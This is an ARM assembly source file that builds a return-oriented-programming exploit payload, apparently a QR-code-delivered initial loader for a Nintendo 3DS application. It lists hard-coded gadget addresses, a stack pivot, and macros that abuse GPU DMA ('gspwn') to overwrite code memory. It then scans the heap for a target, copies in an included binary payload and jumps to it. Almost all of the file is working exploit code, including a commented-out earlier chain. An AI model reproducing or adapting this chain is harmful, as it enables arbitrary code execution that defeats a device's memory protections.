.nds

.include "../../build/constants.s"

.open "sploit_proto.bin","cn_qr_initial_loader.bin",0x0

.arm

CN_CODELOCATIONVA equ (CN_HEAPPAYLOADADR+codePatch-ROP)
CN_GXCOMMAND_ADR equ (CN_GSPHEAP+0x000F0000)
CN_TMPVAR_ADR equ (CN_GSPHEAP+0x000E0000)

ROP_CN_POP_PC equ (0x001001d0)
ROP_CN_POP_R0PC equ (0x002c9628)
ROP_CN_POP_R1PC equ (0x00226734)
ROP_CN_POP_R2R3R4PC equ (0x0020b8e8)
ROP_CN_POP_R4R5R6R7R8R9R10R11PC equ (0x001203b4)
ROP_CN_POP_R3PC equ (0x001bbeb8)
ROP_CN_POP_R4PC equ (0x001dd630)
ROP_CN_POP_R4LR_BX_R3 equ (0x00106eb8)

ROP_CN_CMP_R0x0_MVNNE_R0x0_MOVEQ_R0R4_POP_R4R5R6PC equ (0x0010059c)
ROP_CN_ADD_R0R4_POP_R4PC equ (0x001e2c08)
ROP_CN_LDR_R0R0_POP_R4PC equ (0x001dd62c)
ROP_CN_STR_R0R4_POP_R4PC equ (0x001fb820)

ROP_CN_POP_R3_ADD_SPR3_POP_PC equ (0x001001c8) ; stack pivot

CN_MEMCPY equ (0x00224FB0)
CN_SLEEP equ (0x00293D14)

.macro set_lr,_lr
	.word ROP_CN_POP_R3PC ; pop {r3, pc}
		.word ROP_CN_POP_PC ; r3
	.word ROP_CN_POP_R4LR_BX_R3 ; pop {r4, lr} | bx r3
		.word 0xDEADBABE ; r4 (garbage)
		.word _lr ; lr
.endmacro

; dst_label has to be a file-address-soace address
.macro jump_sp,dst_label
	.word ROP_CN_POP_R3_ADD_SPR3_POP_PC
		.word dst_label - @@pivot_loc ; r3
	@@pivot_loc:
.endmacro

.macro ldr_r0,addr
	.word ROP_CN_POP_R0PC
		.word addr
	.word ROP_CN_LDR_R0R0_POP_R4PC
		.word 0xDEADBABE ; r4 (garbage)
.endmacro

.macro str_r0,addr
	.word ROP_CN_POP_R4PC
		.word addr
	.word ROP_CN_STR_R0R4_POP_R4PC
		.word 0xDEADBABE ; r4 (garbage)
.endmacro

.macro str_val,addr,val
	.word ROP_CN_POP_R0PC
		.word val
	str_r0 addr
.endmacro

.macro ldr_add_r0,addr,addval
	.word ROP_CN_POP_R0PC
		.word addr
	.word ROP_CN_LDR_R0R0_POP_R4PC
		.word addval ; r4
	.word ROP_CN_ADD_R0R4_POP_R4PC
		.word 0xDEADBABE ; r4 (garbage)
.endmacro

.macro cmp_derefptr_constaddr,addr,const
	ldr_add_r0 addr, 0x100000000 - const
	.word ROP_CN_CMP_R0x0_MVNNE_R0x0_MOVEQ_R0R4_POP_R4R5R6PC
		.word 0xDEADBABE ; r4 (garbage)
		.word 0xDEADBABE ; r5 (garbage)
		.word 0xDEADBABE ; r6 (garbage)
.endmacro

.macro cmp_derefptr_r0addr,const,condr0
	.word ROP_CN_LDR_R0R0_POP_R4PC
		.word 0x100000000 - const
	.word ROP_CN_ADD_R0R4_POP_R4PC
		.word condr0 ; r4 (new value for r0 if [r0] == const)
	.word ROP_CN_CMP_R0x0_MVNNE_R0x0_MOVEQ_R0R4_POP_R4R5R6PC
		.word 0xDEADBABE ; r4 (garbage)
		.word 0xDEADBABE ; r5 (garbage)
		.word 0xDEADBABE ; r6 (garbage)
.endmacro

.macro gspwn,dst,src,size
	set_lr ROP_CN_POP_R4R5R6R7R8R9R10R11PC
	.word ROP_CN_POP_R0PC ; pop {r0, pc}
		.word CN_GSPGPU_INTERRUPT_RECEIVER_STRUCT + 0x58 ; r0 (nn__gxlow__CTR__detail__GetInterruptReceiver)
	.word ROP_CN_POP_R1PC ; pop {r1, pc}
		.word CN_SAVE_BUFFER_PTR + @@gxCommandPayload ; r1 (cmd addr)
	.word CN_GSPGPU_GXTRYENQUEUE
		@@gxCommandPayload:
		.word 0x00000004 ; command header (SetTextureCopy)
		.word src ; source address
		.word dst ; destination address (standin, will be filled in)
		.word size ; size
		.word 0xFFFFFFFF ; dim in
		.word 0xFFFFFFFF ; dim out
		.word 0x00000008 ; flags
		.word 0x00000000 ; unused
.endmacro

.macro gspwn_dstderefadd,dst_base,dst_offset_ptr,src,size,offset
	ldr_add_r0 dst_offset_ptr, dst_base 
	str_r0 @@gxCommandPayload + 0x8 + offset
	set_lr ROP_CN_POP_R4R5R6R7R8R9R10R11PC
	.word ROP_CN_POP_R0PC ; pop {r0, pc}
		.word CN_GSPGPU_INTERRUPT_RECEIVER_STRUCT + 0x58 ; r0 (nn__gxlow__CTR__detail__GetInterruptReceiver)
	.word ROP_CN_POP_R1PC ; pop {r1, pc}
		.word CN_SAVE_BUFFER_PTR + @@gxCommandPayload ; r1 (cmd addr)
	.word CN_GSPGPU_GXTRYENQUEUE
		@@gxCommandPayload:
		.word 0x00000004 ; command header (SetTextureCopy)
		.word src ; source address
		.word 0xDEADBABE ; destination address (standin, will be filled in)
		.word size ; size
		.word 0xFFFFFFFF ; dim in
		.word 0xFFFFFFFF ; dim out
		.word 0x00000008 ; flags
		.word 0x00000000 ; unused
.endmacro

.macro memcpy,dst,src,size
	set_lr ROP_CN_NOP
	.word ROP_CN_POP_R0PC ; pop {r0, pc}
		.word dst ; r0
	.word ROP_CN_POP_R1PC ; pop {r1, pc}
		.word src ; r1
	.word ROP_CN_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
		.word size ; r2 (addr)
		.word 0xDEADBABE ; r3 (garbage)
		.word 0xDEADBABE ; r4 (garbage)
		.word 0xDEADBABE ; r5 (garbage)
		.word 0xDEADBABE ; r6 (garbage)
	.word CN_MEMCPY
.endmacro

.macro memcpy_dstderefadd,dst_base_ptr,dst_offset_ptr,src,size,offset
	str_val @@function_call + offset, CN_MEMCPY
	.word ROP_CN_POP_R0PC
		.word dst_offset_ptr
	.word ROP_CN_LDR_R0R0_POP_R4PC
		.word offset + @@addval_dst ; r4 (addval_dst)
	.word ROP_CN_STR_R0R4_POP_R4PC
		.word 0xDEADBABE ; r4 (garbage)
	set_lr ROP_CN_NOP
	.word ROP_CN_POP_R0PC
		.word dst_base_ptr
	.word ROP_CN_POP_R4PC
		@@addval_dst:
		.word 0xDEADBABE ; r4 (initially garbage, overwritten previously)
	.word ROP_CN_ADD_R0R4_POP_R4PC
		.word 0xDEADBABE ; r4 (garbage)
	.word ROP_CN_POP_R1PC ; pop {r1, pc}
		.word src ; r1
	.word ROP_CN_POP_R2R3R4PC
		.word size       ; r2 (addr)
		.word 0xDEADBABE ; r3 (garbage)
		.word 0xDEADBABE ; r4 (garbage)
	.word ROP_CN_POP_R4R5R6R7R8R9R10R11PC
		.word 0xDEADBABE ; r4 (garbage)
		.word 0xDEADBABE ; r5 (garbage)
		.word 0xDEADBABE ; r6 (garbage)
		.word 0xDEADBABE ; r7 (garbage)
		.word 0xDEADBABE ; r8 (garbage)
		.word 0xDEADBABE ; r9 (garbage)
		.word 0xDEADBABE ; r10 (garbage)
		.word 0xDEADBABE ; r11 (garbage)
	@@function_call:
	.word CN_MEMCPY
.endmacro

.macro sleep,nanosec_low,nanosec_high
	set_lr ROP_CN_POP_PC
	.word ROP_CN_POP_R0PC ; pop {r0, pc}
		.word nanosec_low ; r0
	.word ROP_CN_POP_R1PC ; pop {r1, pc}
		.word nanosec_high ; r1
	.word CN_SLEEP
.endmacro

;length
.orga 0x60
	.word endROP-ROP+0xA8-0x64
	; .word secondaryROP-ROP+0xA8-0x64

;ROP
.orga 0xA8
ROP:
	;jump to safer place
		
		.word 0x002c9628 ; pop	{r0, pc}
			.word 0x0FFFE358 ; r0 
		.word 0x001dd62c ; ldr r0, [r0] | pop {r4, pc}
			.word 0x00000008 ; r4
		.word 0x001e2c08 ; add r0, r0, r4 | pop {r4, pc}
			.word 0xDEADC0DE ; r4 (garbage)
		.word 0x001dd62c ; ldr r0, [r0] | pop {r4, pc}
			.word CN_TMPVAR_ADR ; r4 (tmp var adr)
		.word 0x001fb820 ; str r0, [r4] | pop {r4, pc}
			.word -(CN_STACKPAYLOADADR-0xA8) ; r4 (offset)
		.word 0x001e2c08 ; add r0, r0, r4 | pop {r4, pc}
			.word CN_STACKPAYLOADADR+filePayloadOffset-ROP ; r4 (garbage)
		.word 0x001fb820 ; str r0, [r4] | pop {r4, pc}
			.word 0xDEADC0DE ; r4 (garbage)
		.word 0x001001c8 ; pop {r3} | add sp, sp, r3 | pop {pc}
		filePayloadOffset:
			.word 0xDEADC0DE ; r3 (garbage because gets overwritten by previous gadget)

secondaryROP:

	gspwn CN_GSPHEAP + CN_RANDCODEBIN_COPY_BASE, CN_GSPHEAP + CN_RANDCODEBIN_BASE, 0x242000

	sleep 200*1000*1000, 0x00000000

	; initialize loop variables
	str_val CN_SCANLOOP_CURPTR, CN_GSPHEAP + CN_RANDCODEBIN_COPY_BASE - CN_SCANLOOP_STRIDE

	; for(u32* ptr = CN_GSPHEAP + CN_RANDCODEBIN_COPY_BASE; *ptr != magic_value; ptr += CN_SCANLOOP_STRIDE/4);
	scan_loop:
		ldr_add_r0 CN_SCANLOOP_CURPTR, CN_SCANLOOP_STRIDE
		str_r0 CN_SCANLOOP_CURPTR
		cmp_derefptr_r0addr CN_SCANLOOP_MAGICVAL, (scan_loop_pivot - scan_loop_pivot_after)
		str_r0 CN_SCANLOOP_CONDOFFSETPTR

		; essentially if conditional call above returns true, we overwrite scan_loop_pivot with two nops
		; that way we exit the loop
		memcpy_dstderefadd scan_loop_pivot_after, CN_SCANLOOP_CONDOFFSETPTR, scan_loop_pivot_after, 0x8, offset

		; this pivot is non-conditional
		; but once we find what we want, we'll just overwrite it
		scan_loop_pivot:
		jump_sp scan_loop
		scan_loop_pivot_after:
		.word ROP_CN_POP_PC
		.word ROP_CN_POP_PC

	gspwn_dstderefadd CN_GSPHEAP + CN_RANDCODEBIN_BASE - (CN_GSPHEAP + CN_RANDCODEBIN_COPY_BASE), CN_SCANLOOP_CURPTR, code_payload, 0x400

	sleep 200*1000*1000, 0x00000000

	.word CN_SCANLOOP_TARGETCODE

	; ;copy code to GSP heap
	; 	.word 0x001bbeb8 ; pop {r3, pc}
	; 		.word 0x002c9628 ; r3 (pop {r0, pc})
	; 	.word 0x00106eb8 ; pop {r4, lr} | bx r3
	; 		.word 0xDEADC0DE ; r4 (garbage)
	; 		.word 0x002c9628 ; lr (pop	{r0, pc})
	; 	;equivalent to .word 0x002c9628 ; pop {r0, pc}
	; 		.word CN_TMPVAR_ADR-4 ; r0 (tmp var)
	;  		.word 0x002c7784 ; ldr r1, [r0, #4] | add r0, r0, r1 | pop {r3, r4, r5, pc}
	; 		.word 0xDEADC0DE ; r3 (garbage)
	; 		.word 0xDEADC0DE ; r4 (garbage)
	; 		.word 0xDEADC0DE ; r5 (garbage)
	; 	.word 0x002c9628 ; pop	{r0, pc}
	; 		.word CN_CODELOCATIONGSP-codePatch ; r0 (dst)
	; 	.word 0x0020b8e8 ; pop	{r2, r3, r4, pc}
	; 		.word codePatchEnd ; r2 (size)
	; 		.word 0xDEADC0DE ; r3 (garbage)
	; 		.word 0xDEADC0DE ; r4 (garbage)
	; 	.word 0x00224FB0 ; memcpy (ends in BX LR)

	; ;flush data cache
	; 	;equivalent to .word 0x002c9628 ; pop {r0, pc}
	; 		.word CN_GSPHANDLE_ADR ; r0 (handle ptr)
	; 	.word 0x00226734 ; pop	{r1, pc}
	; 		.word 0xFFFF8001 ; r1 (kprocess handle)
	; 	.word 0x0020b8e8 ; pop	{r2, r3, r4, pc}
	; 		.word CN_CODELOCATIONGSP  ; r2 (address)
	; 		.word codePatchEnd-codePatch ; r3 (size)
	; 		.word 0xDEADC0DE ; r4 (garbage)
	; 	.word CN_GSPGPU_FlushDataCache_ADR+4 ; GSPGPU_FlushDataCache (ends in LDMFD   SP!, {R4-R6,PC})
	; 		.word 0xDEADC0DE ; r4 (garbage)
	; 		.word 0xDEADC0DE ; r5 (garbage)
	; 		.word 0xDEADC0DE ; r6 (garbage)


	; ;create GX command
	; 	.word 0x001dd630 ; pop {r4, pc}

	; 		.word CN_GXCOMMAND_ADR+0x0 ; r4
	; 	.word 0x002c9628 ; pop	{r0, pc}
	; 		.word 0x00000004
	; 	.word 0x001fb820 ; str r0, [r4] | pop {r4, pc}

	; 		.word CN_GXCOMMAND_ADR+0x4 ; r4
	; 	.word 0x002c9628 ; pop	{r0, pc}
	; 		.word CN_CODELOCATIONGSP
	; 	.word 0x001fb820 ; str r0, [r4] | pop {r4, pc}

	; 		.word CN_GXCOMMAND_ADR+0x8 ; r4
	; 	.word 0x002c9628 ; pop	{r0, pc}
	; 		.word CN_GSPHEAP+CN_TEXTPA_OFFSET_FROMEND+CN_INITIALCODE_OFFSET+FIRM_APPMEMALLOC ; r0
	; 	.word 0x001fb820 ; str r0, [r4] | pop {r4, pc}

	; 		.word CN_GXCOMMAND_ADR+0xC ; r4
	; 	.word 0x002c9628 ; pop	{r0, pc}
	; 		.word 0x00010000
	; 	.word 0x001fb820 ; str r0, [r4] | pop {r4, pc}

	; 		.word CN_GXCOMMAND_ADR+0x10 ; r4
	; 	.word 0x002c9628 ; pop	{r0, pc}
	; 		.word 0x00000000
	; 	.word 0x001fb820 ; str r0, [r4] | pop {r4, pc}

	; 		.word CN_GXCOMMAND_ADR+0x14 ; r4
	; 	.word 0x001fb820 ; str r0, [r4] | pop {r4, pc}
			
	; 		.word CN_GXCOMMAND_ADR+0x18 ; r4
	; 	.word 0x002c9628 ; pop	{r0, pc}
	; 		.word 0x00000008
	; 	.word 0x001fb820 ; str r0, [r4] | pop {r4, pc}

	; 		.word CN_GXCOMMAND_ADR+0x1C ; r4
	; 	.word 0x002c9628 ; pop	{r0, pc}
	; 		.word 0x00000000
	; 	.word 0x001fb820 ; str r0, [r4] | pop {r4, pc}
	; 		.word 0xDEADC0DE ; r4 (garbage)

	; ;send GX command
	; 	.word 0x002c9628 ; pop	{r0, pc}
	; 		.word 0x356208+0x58 ; r0
	; 	.word 0x00226734 ; pop	{r1, pc}
	; 		.word CN_GXCOMMAND_ADR ; r1 (cmd addr)
	; 	.word CN_nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue+4 ; nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue (ends in LDMFD   SP!, {R4-R8,PC})
	; 		.word 0xDEADC0DE ; r4 (garbage)
	; 		.word 0xDEADC0DE ; r5 (garbage)
	; 		.word 0xDEADC0DE ; r6 (garbage)
	; 		.word 0xDEADC0DE ; r7 (garbage)
	; 		.word 0xDEADC0DE ; r8 (garbage)

	; ;sleep for a second and jump to code
	; 	.word 0x00226734 ; pop {r3, pc}
	; 		.word 0x002c9628 ; r1 (pop {r0, pc})
	; 	.word 0x0012ec64 ; pop {r4, lr} | bx r1
	; 		.word 0xDEADC0DE ; r4 (garbage)
	; 		.word 0x002c9628 ; lr (pop {r0, pc})
	; 	;equivalent to .word 0x002c9628 ; pop {r0, pc}
	; 		.word 0x3B9ACA00 ; r0 = 1 second
	; 	.word 0x00226734 ; pop	{r1, pc}
	; 		.word 0x00000000 ; r1
	; 	.word 0x00293D14 ; svcSleepThread (ends in BX	LR)
	; 	;equivalent to .word 0x002c9628 ; pop {r0, pc}
	; 		.word 0x00000000 ; r0 (time_low)
	; 	.word 0x00226734 ; pop	{r1, pc}
	; 		.word 0x00000000 ; r1 (time_high)
	; 	.word 0x00100000+CN_INITIALCODE_OFFSET ;jump to code
endROP:

.align 4
codePatch:
	.incbin "cn_initial/cn_initial.bin"
	.word 0xDEADDEAD
	.word 0xDEADDEAD
	.word 0xDEADDEAD
	.word 0xDEADDEAD
codePatchEnd:

.Close
